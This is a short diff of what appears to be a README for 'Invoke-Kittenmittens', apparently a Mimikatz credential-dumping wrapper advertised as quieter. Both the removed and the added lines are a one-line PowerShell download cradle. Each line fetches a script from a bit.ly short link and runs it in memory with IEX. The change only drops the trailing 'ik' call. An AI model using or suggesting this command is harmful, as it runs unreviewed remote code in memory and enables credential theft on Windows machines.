@@ -32,5 +32,5 @@ Is your Mimikatz making too much noise all the time? Is your Mimikatz constantly
 
 Run Invoke-Kittenmittens in-memory via a single, condensed CMD command:
 ```
-powershell "IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/2mgBLOs'); ik"
+powershell "IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/2mgBLOs')"
 ```
